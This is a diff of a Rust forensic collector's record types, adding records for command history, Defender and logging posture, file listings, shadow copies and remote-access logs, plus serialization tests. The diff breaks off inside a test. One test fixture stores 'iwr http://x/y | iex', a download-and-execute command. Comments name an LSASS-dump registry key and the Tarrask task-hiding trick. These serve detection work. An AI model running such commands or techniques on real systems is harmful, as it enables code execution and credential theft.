@@ -19,11 +19,110 @@ pub enum Record {
     Process(ProcessRecord),
     NetConn(NetConnRecord),
     Persistence(PersistenceRecord),
-    FileMeta(FileMetaRecord),
-    UsnEvent(UsnEventRecord),
     RegValue(RegValueRecord),
     Execution(ExecutionRecord),
     LogonSession(LogonSessionRecord),
+    /// One line of a shell's command history (PSReadLine `ConsoleHost_history.txt`).
+    /// Additive variant (phase 2B).
+    CommandHistory(CommandHistoryRecord),
+    /// Host defense / logging posture snapshot (Defender state + exclusions, audit and
+    /// PowerShell logging, Sysmon, TaskCache, accessibility binaries, installed program
+    /// folders). One per live run, from the `posture` collector. Additive (phase 3E).
+    Posture(PostureRecord),
+    /// File metadata from a drop-zone listing (no content beyond a short magic read).
+    /// Additive variant (phase 3F).
+    FileListing(FileListingRecord),
+    /// Volume shadow copy / System Restore state of the host. Additive variant (phase 3F).
+    ShadowCopies(ShadowCopyRecord),
+    /// A remote-access tool's own log file: metadata, plus the incoming connections
+    /// it records for the formats cairn parses. Additive variant (phase 3H).
+    RmmLog(RmmLogRecord),
+}
+
+/// Which remote-access self-log a [`RmmLogRecord`] is.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum RmmLogKind {
+    /// AnyDesk `ad.trace` / `ad_svc.trace` (debug trace; metadata only).
+    AnyDeskTrace,
+    /// AnyDesk `connection_trace.txt` (one line per incoming connection; parsed).
+    AnyDeskConnectionTrace,
+    /// TeamViewer `Connections_incoming.txt` (tab-separated; parsed).
+    TeamViewerIncoming,
+    /// TeamViewer `TeamViewer<N>_Logfile.log` (debug log; metadata only).
+    TeamViewerLogfile,
+    /// A `*.log` in a ScreenConnect / ConnectWise Control client folder (metadata only).
+    ScreenConnectLog,
+}
+
+/// A remote-access tool's own log file. Read-only: metadata plus a bounded read of the
+/// file's tail for the parsed kinds.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct RmmLogRecord {
+    /// Which log (not `kind`: that is the [`Record`] tag).
+    pub log_kind: RmmLogKind,
+    pub path: String,
+    pub size: u64,
+    pub modified: Option<DateTime<Utc>>,
+    /// Incoming connections inside the collection window, oldest first, capped.
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub incoming: Vec<RmmConnection>,
+    /// The read stopped at a cap (only the file's tail was read, or older entries in
+    /// the window were dropped).
+    #[serde(default)]
+    pub truncated: bool,
+}
+
+/// One incoming connection a remote-access tool logged.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct RmmConnection {
+    /// Connection start, read as UTC.
+    pub ts: DateTime<Utc>,
+    /// The remote side's tool ID (AnyDesk / TeamViewer ID).
+    pub remote_id: String,
+    /// Remote computer / display name, when logged.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub remote_name: Option<String>,
+    /// Local account the session ran as, when logged.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub user: Option<String>,
+    /// Connection / authentication type column (`User`, `Passwd`, `RemoteControl`, ...).
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub detail: Option<String>,
+}
+
+/// `FileListingRecord.magic` of a file that starts with the minidump signature `MDMP`.
+pub const MAGIC_MINIDUMP: &str = "MDMP";
+
+/// Registry key (under HKLM) whose presence makes Windows Error Reporting write a full
+/// dump of lsass.exe when it crashes: a known way to get an LSASS dump without opening
+/// the process. Shared by the collector that reads it and the analyzer that judges it.
+pub const WER_LSASS_LOCALDUMPS_KEY: &str =
+    r"SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps\lsass.exe";
+
+/// One file found in a drop zone (Desktop, Downloads, Temp, Public, ...): metadata only.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct FileListingRecord {
+    pub path: String,
+    pub size: u64,
+    pub modified: Option<DateTime<Utc>>,
+    /// Signature label from the first 8 bytes: [`MAGIC_MINIDUMP`], `PK` (zip), `7z`,
+    /// `Rar!`, else the bytes as lowercase hex. None when the file could not be read.
+    pub magic: Option<String>,
+    /// File creation time, when the filesystem reports it. Additive; omitted when None.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub created: Option<DateTime<Utc>>,
+}
+
+/// Shadow-copy state at collection time. Each field is None when it could not be read.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ShadowCopyRecord {
+    /// Number of `Win32_ShadowCopy` instances.
+    pub count: Option<u32>,
+    /// True on a workstation (client) edition of Windows (ProductType `WinNT`).
+    pub client_os: Option<bool>,
+    /// True when System Restore / System Protection is turned on and not disabled by policy.
+    pub system_restore_enabled: Option<bool>,
 }
 
 /// EVTX event normalized to JSON-ish fields (Stage 1 primary input).
@@ -51,6 +150,20 @@ pub struct ProcessRecord {
     pub integrity: Option<String>,
     pub user: Option<String>,
     pub start_time: Option<DateTime<Utc>>,
+    /// Where `signer` came from (embedded Authenticode vs. a system catalog). Additive;
+    /// absent in old JSON and omitted when unknown.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub signer_source: Option<SignerSource>,
+}
+
+/// Where a file's signer name was read from. `Embedded` = the PE's own Authenticode
+/// PKCS#7; `Catalog` = the signer of the system catalog (.cat) that lists the file's hash
+/// (most in-box System32 binaries are catalog-signed and carry no embedded signature).
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum SignerSource {
+    Embedded,
+    Catalog,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -64,10 +177,129 @@ pub struct NetConnRecord {
     pub pid: Option<u32>,
 }
 
+/// Every persistence mechanism cairn collects. Serializes as the snake_case string
+/// the collectors have always written (`"run_key"`, `"ifeo"`, ...), so JSON output is
+/// unchanged; in code it is a closed set analyzers and reports can `match` on instead of
+/// comparing free strings. An unknown string read back from old/foreign JSON becomes
+/// [`Mechanism::Other`].
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum Mechanism {
+    RunKey,
+    Service,
+    ScheduledTask,
+    WmiSubscription,
+    Ifeo,
+    Startup,
+    Winlogon,
+    ExplorerPolicyRun,
+    BootExecute,
+    LsaAuthPackage,
+    LsaSecurityPackage,
+    LsaNotificationPackage,
+    TimeProvider,
+    WinlogonNotify,
+    WinlogonMpnotify,
+    PrintMonitor,
+    ActiveSetup,
+    Screensaver,
+    NetshHelper,
+    AppcertDlls,
+    AppinitDlls,
+    SilentExitMonitor,
+    ComHijack,
+    CmdAutorun,
+    OfficeTest,
+    LogonScript,
+    PsProfile,
+    /// A mechanism string this build does not know (deserialization fallback only).
+    #[serde(other)]
+    Other,
+}
+
+impl Mechanism {
+    /// Every known mechanism (excludes [`Mechanism::Other`]), in declaration order.
+    pub const ALL: &'static [Mechanism] = &[
+        Mechanism::RunKey,
+        Mechanism::Service,
+        Mechanism::ScheduledTask,
+        Mechanism::WmiSubscription,
+        Mechanism::Ifeo,
+        Mechanism::Startup,
+        Mechanism::Winlogon,
+        Mechanism::ExplorerPolicyRun,
+        Mechanism::BootExecute,
+        Mechanism::LsaAuthPackage,
+        Mechanism::LsaSecurityPackage,
+        Mechanism::LsaNotificationPackage,
+        Mechanism::TimeProvider,
+        Mechanism::WinlogonNotify,
+        Mechanism::WinlogonMpnotify,
+        Mechanism::PrintMonitor,
+        Mechanism::ActiveSetup,
+        Mechanism::Screensaver,
+        Mechanism::NetshHelper,
+        Mechanism::AppcertDlls,
+        Mechanism::AppinitDlls,
+        Mechanism::SilentExitMonitor,
+        Mechanism::ComHijack,
+        Mechanism::CmdAutorun,
+        Mechanism::OfficeTest,
+        Mechanism::LogonScript,
+        Mechanism::PsProfile,
+    ];
+
+    /// The serialized snake_case name (`"run_key"`, ...). Same string serde writes.
+    pub fn as_str(self) -> &'static str {
+        match self {
+            Mechanism::RunKey => "run_key",
+            Mechanism::Service => "service",
+            Mechanism::ScheduledTask => "scheduled_task",
+            Mechanism::WmiSubscription => "wmi_subscription",
+            Mechanism::Ifeo => "ifeo",
+            Mechanism::Startup => "startup",
+            Mechanism::Winlogon => "winlogon",
+            Mechanism::ExplorerPolicyRun => "explorer_policy_run",
+            Mechanism::BootExecute => "boot_execute",
+            Mechanism::LsaAuthPackage => "lsa_auth_package",
+            Mechanism::LsaSecurityPackage => "lsa_security_package",
+            Mechanism::LsaNotificationPackage => "lsa_notification_package",
+            Mechanism::TimeProvider => "time_provider",
+            Mechanism::WinlogonNotify => "winlogon_notify",
+            Mechanism::WinlogonMpnotify => "winlogon_mpnotify",
+            Mechanism::PrintMonitor => "print_monitor",
+            Mechanism::ActiveSetup => "active_setup",
+            Mechanism::Screensaver => "screensaver",
+            Mechanism::NetshHelper => "netsh_helper",
+            Mechanism::AppcertDlls => "appcert_dlls",
+            Mechanism::AppinitDlls => "appinit_dlls",
+            Mechanism::SilentExitMonitor => "silent_exit_monitor",
+            Mechanism::ComHijack => "com_hijack",
+            Mechanism::CmdAutorun => "cmd_autorun",
+            Mechanism::OfficeTest => "office_test",
+            Mechanism::LogonScript => "logon_script",
+            Mechanism::PsProfile => "ps_profile",
+            Mechanism::Other => "other",
+        }
+    }
+
+    /// File-backed mechanisms: the persistence entry is a file (Startup folder item,
+    /// PowerShell profile), not a registry value.
+    pub fn is_file_backed(self) -> bool {
+        matches!(self, Mechanism::Startup | Mechanism::PsProfile)
+    }
+}
+
+impl std::fmt::Display for Mechanism {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        f.write_str(self.as_str())
+    }
+}
+
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct PersistenceRecord {
-    pub mechanism: String, // run_key|service|scheduled_task|wmi_subscription|ifeo|startup|winlogon
-    pub location: String,  // registry key / file path / wmi binding
+    pub mechanism: Mechanism,
+    pub location: String, // registry key / file path / wmi binding
     pub value: Option<String>,
     pub command: Option<String>,
     pub binary_path: Option<String>,
@@ -75,32 +307,20 @@ pub struct PersistenceRecord {
     pub signed: Option<bool>,
     pub signer: Option<String>,
     pub last_write: Option<DateTime<Utc>>,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct FileMetaRecord {
-    pub path: String,
-    pub size: u64,
-    pub sha256: Option<String>,
-    // MACB; SI vs FN exposed to allow timestomp delta detection.
-    pub si_btime: Option<DateTime<Utc>>,
-    pub si_mtime: Option<DateTime<Utc>>,
-    pub fn_btime: Option<DateTime<Utc>>,
-    pub fn_mtime: Option<DateTime<Utc>>,
-    pub zone_identifier: Option<String>, // mark-of-the-web
-    /// Path-resolution quality (path map, S2-O): Some(true) = walked clean to root
-    /// (C:\); Some(false) = best-effort (orphan/truncated/cyclic — `path` is a partial
-    /// REAL path fragment, never prefixed/polluted); None = resolution disabled or no
-    /// path. The `path` string stays a clean filesystem path for any string consumer.
-    pub path_complete: Option<bool>,
-}
-
-#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
-pub struct UsnEventRecord {
-    pub ts: DateTime<Utc>,
-    pub path: String,
-    pub reason: String, // create|delete|rename|...
-    pub mft_ref: u64,
+    /// Where `signer` came from (see [`SignerSource`]). Additive; omitted when unknown.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub signer_source: Option<SignerSource>,
+    /// WMI subscriptions only: `Some(true)` for a filter/consumer joined by a
+    /// `__FilterToConsumerBinding`, `Some(false)` for an orphaned (unbound) filter or
+    /// consumer. `None` for every other mechanism. Additive; omitted when None.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub bound: Option<bool>,
+    /// Service `Start` value (registry DWORD) for `Mechanism::Service` records:
+    /// 0 boot, 1 system, 2 auto, 3 demand (manual). Disabled (4) services are not
+    /// emitted. None for every other mechanism. Additive (phase 2B): lets analyzers
+    /// weigh a demand-start service lower than an autostart one.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub service_start: Option<u32>,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -110,20 +330,47 @@ pub struct RegValueRecord {
     pub value: String,
     pub data: String,
     pub last_write: Option<DateTime<Utc>>,
+    /// Position in a most-recently-used list (RunMRU `MRUList`, TypedPaths `urlN`):
+    /// 0 = most recent. The key's LastWrite only dates the rank-0 entry. None when the
+    /// value is not part of an MRU list or its rank is unknown. Additive (phase 2B).
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub mru_rank: Option<u32>,
 }
 
-/// Evidence-of-execution from Amcache/Shimcache/Prefetch/UserAssist/BAM/SRUM.
+/// Evidence-of-execution (currently Prefetch).
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct ExecutionRecord {
-    pub source: String, // amcache|amcache_driver|shimcache|prefetch|userassist|bam|srum
+    pub source: String, // prefetch
     pub path: String,
     pub first_run: Option<DateTime<Utc>>,
     pub last_run: Option<DateTime<Utc>>,
     pub run_count: Option<u32>,
     pub sha1: Option<String>,
     pub user_sid: Option<String>,
-    /// shimcache presence != execution; this flags engine-provided exec evidence.
+    /// Whether the source proves execution (not just presence).
     pub execution_confirmed: Option<bool>,
+    /// The executable's full path as the artifact recorded it, verbatim (prefetch:
+    /// the NT volume form `\VOLUME{...}\WINDOWS\SYSTEM32\X.EXE` from the
+    /// filename-strings section). `path` holds the drive-letter form when the volume
+    /// could be mapped, else the bare name. Additive (phase 2B).
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub full_path: Option<String>,
+}
+
+/// One command-history line from a user's shell history file (PSReadLine
+/// `ConsoleHost_history.txt`). Collected read-only; only the tail of each file is kept.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct CommandHistoryRecord {
+    /// Profile folder name the history belongs to (e.g. `alice` for `C:\Users\alice`).
+    pub user: String,
+    /// Full path of the history file.
+    pub path: String,
+    /// 1-based physical line number within the file.
+    pub line_no: u64,
+    pub command: String,
+    /// The history file's mtime: when its LAST line was written (earlier lines are older).
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub last_write: Option<DateTime<Utc>>,
 }
 
 /// A live logon session (LSA/WTS enumeration). "Who is using the host right now."
@@ -140,6 +387,154 @@ pub struct LogonSessionRecord {
     /// "unknown" is conservatively treated as "not active" rather than assumed true.
     #[serde(default)]
     pub state_active: bool,
+    /// WTS connection state label (`active`, `disconnected`, `idle`, ...) when the
+    /// session maps to a WTS session. Additive; omitted when unknown.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub session_state: Option<String>,
+    /// LSA `LogonServer`: the server that authenticated the logon (e.g. a DC name).
+    /// Additive; omitted when unknown.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub logon_server: Option<String>,
+}
+
+/// Host defense and logging posture, read-only (phase 3E `posture` collector).
+///
+/// Every `Option<bool>` is tri-state: `Some(true)` / `Some(false)` when the setting was
+/// read (an absent policy value is read as its documented default, i.e. off), `None`
+/// when it could not be determined (access denied, API unavailable, off-platform). A
+/// `None` is never "clean": the reason is in the manifest source errors.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct PostureRecord {
+    /// When the snapshot was taken (UTC).
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub collected_at: Option<DateTime<Utc>>,
+    /// Advanced audit policy "Process Creation" (Security 4688) logs success events.
+    pub audit_process_creation: Option<bool>,
+    /// "Logon" subcategory (4624/4625) logs success or failure events.
+    #[serde(default)]
+    pub audit_logon: Option<bool>,
+    /// "Other Object Access Events" (4698 scheduled task created) logs success events.
+    #[serde(default)]
+    pub audit_other_object_access: Option<bool>,
+    /// "User Account Management" (4720/4722/4724/4726/4738) logs success events.
+    #[serde(default)]
+    pub audit_user_account_management: Option<bool>,
+    /// "Security Group Management" (4728/4732/4756) logs success events.
+    #[serde(default)]
+    pub audit_security_group_management: Option<bool>,
+    /// `ProcessCreationIncludeCmdLine_Enabled` = 1: 4688 carries the command line.
+    pub cmdline_in_4688: Option<bool>,
+    /// PowerShell `EnableScriptBlockLogging` = 1 (4104).
+    pub ps_scriptblock: Option<bool>,
+    /// PowerShell `EnableModuleLogging` = 1 (4103).
+    #[serde(default)]
+    pub ps_module_logging: Option<bool>,
+    /// A Sysmon service (SysmonDrv / Sysmon64 / Sysmon) is registered.
+    pub sysmon_present: Option<bool>,
+    /// The `Microsoft-Windows-Sysmon/Operational` channel is registered.
+    #[serde(default)]
+    pub sysmon_channel: Option<bool>,
+    /// Defender policy values (`HKLM\SOFTWARE\Policies\Microsoft\Windows Defender`).
+    #[serde(default)]
+    pub defender_policy: DefenderPolicy,
+    /// `HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection` (5 = on).
+    #[serde(default)]
+    pub tamper_protection: Option<u32>,
+    /// Defender exclusions (preference and policy keys) that could be read.
+    #[serde(default)]
+    pub defender_exclusions: Vec<DefenderExclusion>,
+    /// Exclusion keys that exist but could not be read (e.g. `Exclusions\Paths`):
+    /// recorded so an unreadable list is never mistaken for an empty one.
+    #[serde(default)]
+    pub exclusions_unreadable: Vec<String>,
+    /// Task leaves under `Schedule\TaskCache\Tree` (keys carrying an `Id` value).
+    #[serde(default)]
+    pub task_cache: Vec<TaskCacheEntry>,
+    /// The accessibility binaries in System32 (sethc, utilman, osk, ...).
+    #[serde(default)]
+    pub accessibility_binaries: Vec<AccessibilityBinary>,
+    /// Top-level folders of Program Files (both), ProgramData and each user's
+    /// AppData\Local, AppData\Roaming and AppData\Local\Programs.
+    #[serde(default)]
+    pub program_dirs: Vec<ProgramDir>,
+}
+
+/// Raw Defender policy DWORDs; None when the value is absent or unreadable.
+#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
+pub struct DefenderPolicy {
+    /// `Windows Defender\DisableAntiSpyware`.
+    pub disable_antispyware: Option<u32>,
+    /// `Windows Defender\Real-Time Protection\DisableRealtimeMonitoring`.
+    pub disable_realtime_monitoring: Option<u32>,
+    /// `Windows Defender\Real-Time Protection\DisableBehaviorMonitoring`.
+    pub disable_behavior_monitoring: Option<u32>,
+}
+
+/// Which Defender exclusion list an entry is on.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum ExclusionKind {
+    Path,
+    Extension,
+    Process,
+    IpAddress,
+}
+
+/// One Defender exclusion (the registry value name under `Exclusions\<Kind>`).
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct DefenderExclusion {
+    pub kind: ExclusionKind,
+    pub value: String,
+    /// True when it came from the Group Policy key (`SOFTWARE\Policies\...`).
+    pub policy: bool,
+    /// Full registry key the value lives under (`HKLM\...\Exclusions\Paths`).
+    pub key: String,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub last_write: Option<DateTime<Utc>>,
+}
+
+/// One scheduled task as the TaskCache registry tree knows it.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct TaskCacheEntry {
+    /// Task path relative to the Tree root, `\`-separated (`\Microsoft\X\Task`).
+    pub path: String,
+    /// Full registry key (`HKLM\...\TaskCache\Tree\...`).
+    pub key: String,
+    /// The `Id` value (task GUID) when present.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub id: Option<String>,
+    /// The key has an `SD` (security descriptor) value. Tarrask deletes it to hide the
+    /// task from schtasks / Task Scheduler.
+    pub sd_present: bool,
+    /// The matching XML exists under `System32\Tasks`; None when that could not be
+    /// checked (folder not readable).
+    pub file_present: Option<bool>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub last_write: Option<DateTime<Utc>>,
+}
+
+/// One accessibility binary in System32 and what its file says it is.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct AccessibilityBinary {
+    /// File name, lowercase (`sethc.exe`).
+    pub name: String,
+    pub path: String,
+    /// False when the file is absent (then the other fields are None).
+    pub exists: bool,
+    /// Version-resource `OriginalFilename` (as written in the file).
+    pub original_filename: Option<String>,
+    pub signed: Option<bool>,
+    pub signer: Option<String>,
+    pub sha256: Option<String>,
+    pub last_write: Option<DateTime<Utc>>,
+}
+
+/// One top-level folder under a program-install root.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct ProgramDir {
+    pub path: String,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub last_write: Option<DateTime<Utc>>,
 }
 
 #[cfg(test)]
@@ -151,7 +546,7 @@ mod tests {
     #[test]
     fn persistence_record_signer_roundtrips() {
         let mut r = PersistenceRecord {
-            mechanism: "run_key".into(),
+            mechanism: Mechanism::RunKey,
             location: "HKCU\\...\\Run".into(),
             value: Some("X".into()),
             command: Some("C:\\a.exe".into()),
@@ -160,6 +555,9 @@ mod tests {
             signed: Some(true),
             signer: Some("Docker Inc".into()),
             last_write: None,
+            bound: None,
+            signer_source: None,
+            service_start: None,
         };
         let j = serde_json::to_string(&r).unwrap();
         assert!(j.contains(r#""signer":"Docker Inc""#));
@@ -184,6 +582,7 @@ mod tests {
             integrity: None,
             user: None,
             start_time: None,
+            signer_source: None,
         };
         let j = serde_json::to_string(&r).unwrap();
         let back: ProcessRecord = serde_json::from_str(&j).unwrap();
@@ -203,6 +602,7 @@ mod tests {
             integrity: None,
             user: None,
             start_time: None,
+            signer_source: None,
         };
         let j = serde_json::to_string(&r).unwrap();
         let back: ProcessRecord = serde_json::from_str(&j).unwrap();
@@ -253,7 +653,7 @@ mod tests {
     #[test]
     fn execution_record_kind_tag_is_snake_case() {
         let rec = Record::Execution(ExecutionRecord {
-            source: "amcache".into(),
+            source: "prefetch".into(),
             path: r"C:\tmp\evil.exe".into(),
             first_run: None,
             last_run: None,
@@ -261,57 +661,124 @@ mod tests {
             sha1: None,
             user_sid: None,
             execution_confirmed: Some(false),
+            full_path: None,
         });
         let json = serde_json::to_string(&rec).unwrap();
         assert!(json.contains("\"kind\":\"execution\""));
     }
 
     #[test]
-    fn file_meta_fn_mtime_roundtrips_and_old_json_is_none() {
-        let r = FileMetaRecord {
-            path: r"C:\Windows\notepad.exe".into(),
-            size: 0,
-            sha256: None,
-            si_btime: Some(Utc.with_ymd_and_hms(2026, 1, 1, 0, 0, 0).unwrap()),
-            si_mtime: Some(Utc.with_ymd_and_hms(2026, 2, 2, 0, 0, 0).unwrap()),
-            fn_btime: Some(Utc.with_ymd_and_hms(2026, 1, 1, 0, 0, 0).unwrap()),
-            fn_mtime: Some(Utc.with_ymd_and_hms(2026, 1, 1, 0, 0, 0).unwrap()),
-            zone_identifier: None,
-            path_complete: None,
-        };
-        let j = serde_json::to_string(&r).unwrap();
-        assert!(j.contains("fn_mtime"));
-        let back: FileMetaRecord = serde_json::from_str(&j).unwrap();
-        assert_eq!(back.fn_mtime, r.fn_mtime);
+    fn mechanism_serializes_as_legacy_snake_case_strings() {
+        for m in Mechanism::ALL {
+            let j = serde_json::to_string(m).unwrap();
+            assert_eq!(j, format!("\"{}\"", m.as_str()), "{m:?}");
+            let back: Mechanism = serde_json::from_str(&j).unwrap();
+            assert_eq!(back, *m);
+        }
+        assert_eq!(
+            serde_json::to_string(&Mechanism::WinlogonMpnotify).unwrap(),
+            "\"winlogon_mpnotify\""
+        );
+        let unknown: Mechanism = serde_json::from_str("\"brand_new_thing\"").unwrap();
+        assert_eq!(unknown, Mechanism::Other);
+    }
 
-        // Older JSONL (FR1 replay) lacking fn_mtime must deserialize to None.
-        let old = r#"{"path":"x","size":0,"sha256":null,"si_btime":null,"si_mtime":null,"fn_btime":null,"zone_identifier":null}"#;
-        let parsed: FileMetaRecord = serde_json::from_str(old).unwrap();
-        assert_eq!(parsed.fn_mtime, None);
+    /// Phase 2B additive fields are omitted when None and default on old JSON.
+    #[test]
+    fn phase2b_additive_fields_skip_when_none_and_default_on_old_json() {
+        let old = r#"{"kind":"reg_value","hive":"HKCU","key":"k","value":"a","data":"d","last_write":null}"#;
+        let Record::RegValue(rv) = serde_json::from_str::<Record>(old).unwrap() else {
+            panic!("expected RegValue");
+        };
+        assert_eq!(rv.mru_rank, None);
+        let j = serde_json::to_string(&Record::RegValue(rv.clone())).unwrap();
+        assert!(!j.contains("mru_rank"), "{j}");
+        let ranked = RegValueRecord {
+            mru_rank: Some(0),
+            ..rv
+        };
+        assert!(serde_json::to_string(&ranked)
+            .unwrap()
+            .contains(r#""mru_rank":0"#));
+
+        let old_p = r#"{"mechanism":"service","location":"l","value":null,"command":null,"binary_path":null,"binary_sha256":null,"signed":null,"signer":null,"last_write":null}"#;
+        let p: PersistenceRecord = serde_json::from_str(old_p).unwrap();
+        assert_eq!(p.service_start, None);
+        assert!(!serde_json::to_string(&p).unwrap().contains("service_start"));
+
+        let old_e = r#"{"kind":"execution","source":"prefetch","path":"X.EXE","first_run":null,"last_run":null,"run_count":1,"sha1":null,"user_sid":null,"execution_confirmed":true}"#;
+        let Record::Execution(e) = serde_json::from_str::<Record>(old_e).unwrap() else {
+            panic!("expected Execution");
+        };
+        assert_eq!(e.full_path, None);
     }
 
     #[test]
-    fn file_meta_path_complete_roundtrips_and_old_json_none() {
-        let r = FileMetaRecord {
-            path: r"C:\Users\a\evil.exe".into(),
-            size: 0,
-            sha256: None,
-            si_btime: None,
-            si_mtime: None,
-            fn_btime: None,
-            fn_mtime: None,
-            zone_identifier: None,
-            path_complete: Some(true),
-        };
-        let j = serde_json::to_string(&r).unwrap();
-        assert!(j.contains("path_complete"));
-        let back: FileMetaRecord = serde_json::from_str(&j).unwrap();
-        assert_eq!(back.path_complete, Some(true));
+    fn command_history_record_kind_tag_round_trips() {
+        let rec = Record::CommandHistory(CommandHistoryRecord {
+            user: "alice".into(),
+            path: r"C:\Users\alice\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt".into(),
+            line_no: 42,
+            command: "iwr http://x/y | iex".into(),
+            last_write: None,
+        });
+        let json = serde_json::to_string(&rec).unwrap();
+        assert!(json.contains(r#""kind":"command_history""#), "{json}");
+        assert!(!json.contains("last_write"), "{json}");
+        let back: Record = serde_json::from_str(&json).unwrap();
+        assert_eq!(serde_json::to_string(&back).unwrap(), json);
+    }
 
-        // Older JSONL (FR1 replay) lacking path_complete must deserialize to None.
-        let old = r#"{"path":"x","size":0,"sha256":null,"si_btime":null,"si_mtime":null,"fn_btime":null,"fn_mtime":null,"zone_identifier":null}"#;
-        let parsed: FileMetaRecord = serde_json::from_str(old).unwrap();
-        assert_eq!(parsed.path_complete, None);
+    /// Phase 3F variants: snake_case kind tags, optional fields omitted when None.
+    #[test]
+    fn phase3f_variants_round_trip() {
+        let rec = Record::FileListing(FileListingRecord {
+            path: r"C:\Windows\Temp\lsass.dmp".into(),
+            size: 42,
+            modified: None,
+            magic: Some(MAGIC_MINIDUMP.into()),
+            created: None,
+        });
+        let json = serde_json::to_string(&rec).unwrap();
+        assert!(json.contains(r#""kind":"file_listing""#), "{json}");
+        assert!(!json.contains("created"), "{json}");
+        let back: Record = serde_json::from_str(&json).unwrap();
+        assert_eq!(serde_json::to_string(&back).unwrap(), json);
+
+        let rec = Record::ShadowCopies(ShadowCopyRecord {
+            count: Some(0),
+            client_os: Some(true),
+            system_restore_enabled: None,
+        });
+        let json = serde_json::to_string(&rec).unwrap();
+        assert!(json.contains(r#""kind":"shadow_copies""#), "{json}");
+        let back: Record = serde_json::from_str(&json).unwrap();
+        assert_eq!(serde_json::to_string(&back).unwrap(), json);
+    }
+
+    /// Phase 3H variant: snake_case kind tags, empty / None fields omitted.
+    #[test]
+    fn rmm_log_record_round_trips() {
+        let rec = Record::RmmLog(RmmLogRecord {
+            log_kind: RmmLogKind::AnyDeskConnectionTrace,
+            path: r"C:\ProgramData\AnyDesk\connection_trace.txt".into(),
+            size: 120,
+            modified: None,
+            incoming: vec![RmmConnection {
+                ts: DateTime::UNIX_EPOCH,
+                remote_id: "123456789".into(),
+                remote_name: None,
+                user: None,
+                detail: Some("User".into()),
+            }],
+            truncated: false,
+        });
+        let json = serde_json::to_string(&rec).unwrap();
+        assert!(json.contains(r#""kind":"rmm_log""#), "{json}");
+        assert!(json.contains(r#""any_desk_connection_trace""#), "{json}");
+        assert!(!json.contains("remote_name"), "{json}");
+        let back: Record = serde_json::from_str(&json).unwrap();
+        assert_eq!(serde_json::to_string(&back).unwrap(), json);
     }
 
     #[test]
@@ -323,6 +790,8 @@ mod tests {
             source: Some("10.0.0.5".into()),
             session_id: Some(2),
             state_active: true,
+            logon_server: None,
+            session_state: None,
         });
         let json = serde_json::to_string(&rec).unwrap();
         assert!(json.contains("\"kind\":\"logon_session\""));
@@ -348,6 +817,8 @@ mod tests {
             source: None,
             session_id: Some(3),
             state_active: true,
+            logon_server: None,
+            session_state: None,
         });
         let json = serde_json::to_string(&rec).unwrap();
         assert!(json.contains(r#""state_active":true"#));
@@ -356,5 +827,68 @@ mod tests {
             Record::LogonSession(back_rec) => assert!(back_rec.state_active),
             other => panic!("expected LogonSession, got {other:?}"),
         }
+    }
+
+    /// Phase 2A additive fields: omitted when None, absent keys default to None, and
+    /// SignerSource serializes as a snake_case string.
+    #[test]
+    fn phase2a_additive_fields_are_optional_and_roundtrip() {
+        let old_proc = r#"{"pid":1,"ppid":0,"image":"a","cmdline":"","signed":null,"signer":null,"binary_sha256":null,"integrity":null,"user":null,"start_time":null}"#;
+        let p: ProcessRecord = serde_json::from_str(old_proc).unwrap();
+        assert_eq!(p.signer_source, None);
+        let j = serde_json::to_string(&p).unwrap();
+        assert!(!j.contains("signer_source"), "None must be omitted: {j}");
+
+        let mut p2 = p.clone();
+        p2.signer_source = Some(SignerSource::Catalog);
+        let j2 = serde_json::to_string(&p2).unwrap();
